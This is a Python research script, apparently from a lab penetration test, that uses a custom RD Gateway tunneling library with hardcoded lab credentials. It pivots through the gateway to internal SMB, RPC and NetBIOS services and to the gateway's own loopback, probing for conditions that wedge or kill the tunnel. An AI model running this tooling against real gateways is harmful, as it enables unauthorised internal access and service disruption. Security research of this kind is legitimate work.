#!/usr/bin/env python3
"""Task A wire matrix — name-list shapes vs refused/dead/live names.

Fresh tunnel per case (svcaccount = push-free). Every tunnel packet is
tap-logged (TX/RX + timestamp) like loserfate.py. Per case: does the create
grant? does data flow (SMB2 negotiate -> ServerGUID)? does the channel close
clean? does the TUNNEL survive a post-case probe create?

Cases (port 445 unless noted):
  A1 [SSH]            single refused-only name
  A2 [SSH, LO]        tonight's stillborn repeat
  A3 [LO, SSH]        loopback-first, refused loser second
  A4 [SSH, DC]        refused first, live second
  A5 [DC, SSH]        live first, refused loser second
  A6 [DEAD, LO]       control: blackhole loser is safe (known)
  A8 [DEAD]           single blackhole: 25s silence -> late denial (known)
  A7 loopback census  127.0.0.1:135 RPC bind / :139 NBSS+SMB2 (fresh tunnel each)
"""
import socket
import struct
import sys
import time
import uuid as _uuid

sys.path.insert(0, "/home/kali/workspace/RDetour")
from rdetour import (RDGTunnel, RDGError, RDGPolicyError,  # noqa: E402
                     smb2_negotiate, smb2_server_guid)

GW = "ecorp-rds.ecorp.local"
DC = "192.168.15.40"      # live SMB2 (signing)
SSH = "192.168.15.152"    # 445 REFUSED
DEAD = "192.168.15.99"    # blackhole (no ARP)
LO = "127.0.0.1"

T0 = time.time()


def ts():
    return "%7.3f" % (time.time() - T0)


def say(*a):
    print(*a, flush=True)


class TapTunnel(RDGTunnel):
    eof = False

    def _out_fill(self, n, timeout=10):
        try:
            super()._out_fill(n, timeout)
        except RDGError as e:
            if "EOF" in str(e):
                self.eof = True
            raise

    def send_packet(self, raw):
        pt = int.from_bytes(raw[0:2], "little")
        say("%s   TX 0x%02x len=%d" % (ts(), pt, len(raw)))
        return super().send_packet(raw)

    def recv_packet(self, timeout=15):
        t0 = time.monotonic()
        p = super().recv_packet(timeout)
        dt = time.monotonic() - t0
        if p is None:
            say("%s   RX -    after %.2fs (eof=%s out_dead=%s)"
                % (ts(), dt, self.eof, self.out_dead))
        else:
            say("%s   RX 0x%02x len=%d body=%s (%.2fs)"
                % (ts(), p[0], 8 + len(p[1]), p[1][:12].hex(), dt))
        return p


def fresh(tag):
    say("=== %s new tunnel ===" % tag)
    t = TapTunnel(GW, user="svcaccount", password="svcaccount",
                  domain="ECORP.local", verbose=False, connect_timeout=10)
    t.establish(auth_timeout=8)
    return t


def probe(t, tag):
    """Post-case tunnel probe: loopback create + negotiate + close."""
    if t.closed or t.eof or t.out_dead:
        return "DEAD(pre, eof=%s out_dead=%s)" % (t.eof, t.out_dead)
    say("%s [%s] probing tunnel (loopback create)..." % (ts(), tag))
    try:
        t.open_channel([LO], 445)
        t.write(smb2_negotiate())
        buf = b""
        t0 = time.monotonic()
        while len(buf) < 92 and time.monotonic() - t0 < 4:
            d = t.read(timeout=1)
            if d:
                buf += d
        g = smb2_server_guid(buf)
        t.close_channel()
        return "ALIVE (probe guid=%s)" % (g.hex()[:8] if g else "none")
    except RDGError as e:
        return "DEAD (%s; eof=%s out_dead=%s)" % (e, t.eof, t.out_dead)
    except OSError as e:
        return "DEAD (OSError %r)" % e


def case(tag, names, port=445, data_wait=5.0):
    say("\n########## %s names=%s port=%d ##########" % (tag, names, port))
    t = fresh(tag)
    verdict = close = "n/a"
    data_bytes = 0
    guid = None
    try:
        t.open_channel(names, port)
        verdict = "GRANTED"
    except RDGPolicyError as e:
        verdict = "DENIED(%s)" % e
    except RDGError as e:
        verdict = "FAIL(%s; eof=%s out_dead=%s)" % (e, t.eof, t.out_dead)
    say("%s [%s] create verdict: %s" % (ts(), tag, verdict))
    if verdict == "GRANTED":
        t.write(smb2_negotiate())
        buf = b""
        t0 = time.monotonic()
        while time.monotonic() - t0 < data_wait and t.channel_open and not t.closed:
            d = t.read(timeout=1)
            if d:
                buf += d
        data_bytes = len(buf)
        guid = smb2_server_guid(buf)
        say("%s [%s] data=%dB guid=%s chan_open=%s srv_close_reason=%s"
            % (ts(), tag, data_bytes, guid.hex() if guid else None,
               t.channel_open, hex(t.last_srv_close_reason or 0)))
        try:
            t.close_channel()
            close = "clean"
        except RDGError as e:
            close = "FAIL(%s)" % e
        say("%s [%s] close: %s" % (ts(), tag, close))
    fate = probe(t, tag)
    say(">>> %s RESULT: create=%s data=%dB guid=%s close=%s tunnel=%s"
        % (tag, verdict, data_bytes, guid.hex()[:8] if guid else None,
           close, fate))
    t.close()
    return fate


def rpc_bind(xid=1):
    """MS-RPCE BIND to EPM (e1af8308-... v3.0) over NDR 8a885d04-... v2.0."""
    def uuid_le(u):
        return _uuid.UUID(u).bytes_le

    ctx = (struct.pack("<HH", 0, 1) +
           uuid_le("e1af8308-5d1f-11c9-91a4-08002b14a0fa") +
           struct.pack("<I", 3) +
           uuid_le("8a885d04-1ceb-11c9-9fe8-08002b104860") +
           struct.pack("<I", 2))
    body = struct.pack("<IIIBBH", 4096, 4096, 0, 1, 0, 0) + ctx
    frag_len = 16 + len(body)
    # version, minor, type, flags, drep(4), frag_len(2), auth_len(2), xid(4)
    hdr = bytes([5, 0, 11, 3, 0x10, 0, 0, 0]) + struct.pack("<HHI", frag_len,
                                                            0, xid)
    return hdr + body


def nbss_name(s):
    out = b""
    for ch in s.encode()[:15].ljust(16, b" "):
        out += bytes([0x41 + (ch >> 4), 0x41 + (ch & 0xF)])
    return out


def case_135():
    say("\n########## A7a 127.0.0.1:135 RPC bind ##########")
    t = fresh("A7a-135")
    try:
        t.open_channel([LO], 135)
        say("%s [A7a] create GRANTED" % ts())
        t.write(rpc_bind())
        buf = b""
        t0 = time.monotonic()
        while time.monotonic() - t0 < 5 and t.channel_open:
            d = t.read(timeout=1)
            if d:
                buf += d
        say("%s [A7a] rpc reply %dB type=0x%02x (bind_ack=0x0c)"
            % (ts(), len(buf), buf[2] if len(buf) > 2 else 0))
        t.close_channel()
    except RDGError as e:
        say("%s [A7a] create/data FAIL: %s" % (ts(), e))
    say(">>> A7a 135 tunnel=%s" % probe(t, "A7a"))
    t.close()


def case_139():
    say("\n########## A7b 127.0.0.1:139 NBSS session + SMB2 ##########")
    t = fresh("A7b-139")
    try:
        t.open_channel([LO], 139)
        say("%s [A7b] create GRANTED" % ts())
        called = nbss_name("*SMBSERVER")
        calling = nbss_name(socket.gethostname()[:15])
        sessreq = b"\x81\x00" + struct.pack(">H", len(called) + len(calling)) \
            + called + calling
        t.write(sessreq)
        buf = b""
        t0 = time.monotonic()
        while time.monotonic() - t0 < 3 and t.channel_open:
            d = t.read(timeout=1)
            if d:
                buf += d
        say("%s [A7b] session resp %dB hdr=%s (0x82=granted)"
            % (ts(), len(buf), buf[:4].hex()))
        if buf[:1] == b"\x82":
            t.write(smb2_negotiate())
            nb = b""
            while len(nb) < 92 and time.monotonic() - t0 < 8:
                d = t.read(timeout=1)
                if d:
                    nb += d
            g = smb2_server_guid(nb) if nb[:1] == b"\x00" else None
            # NBSS adds 4 bytes in front of the SMB2 response
            g2 = smb2_server_guid(nb[4:]) if len(nb) > 96 else None
            say("%s [A7b] negotiate reply %dB guid=%s"
                % (ts(), len(nb), (g or g2 or b"").hex()))
        t.close_channel()
    except RDGError as e:
        say("%s [A7b] create/data FAIL: %s" % (ts(), e))
    say(">>> A7b 139 tunnel=%s" % probe(t, "A7b"))
    t.close()


if __name__ == "__main__":
    socket.setdefaulttimeout(20)
    which = sys.argv[1] if len(sys.argv) > 1 else "rest"
    if which == "full":
        case("A1-refused-single", [SSH])
        case("A2-refused+lo", [SSH, LO])
        case("A3-lo+refused", [LO, SSH])
        case("A4-refused+live", [SSH, DC])
        case("A5-live+refused", [DC, SSH])
        case("A6-dead+lo-ctl", [DEAD, LO])
        case_135()
        case_139()
        case("A8-dead-single", [DEAD], data_wait=2.0)
    else:
        # round 2: confirmations after A1-A7
        case("R1-live-single", [DC])            # single-name live create safe?
        case("R2-race-x5", [DC, LO])            # live-first vs loopback race
        case("R3-race2-x5", [DC, LO])
        # R4: is a wedged tunnel recoverable? wedge it, then create again
        say("\n########## R4 create-on-wedged-tunnel ##########")
        t = fresh("R4")
        try:
            t.open_channel([SSH, LO], 445)
            say("%s [R4] wedge create GRANTED" % ts())
        except RDGError as e:
            say("%s [R4] create FAIL %s" % (ts(), e))
        time.sleep(3)
        try:
            t.open_channel([LO], 445)
            say("%s [R4] post-wedge create GRANTED?!" % ts())
            t.close_channel()
        except RDGError as e:
            say("%s [R4] post-wedge create FAIL: %s (eof=%s out_dead=%s)"
                % (ts(), e, t.eof, t.out_dead))
        t.close()
        case("A8-dead-single", [DEAD], data_wait=2.0)
    say("\nDONE")
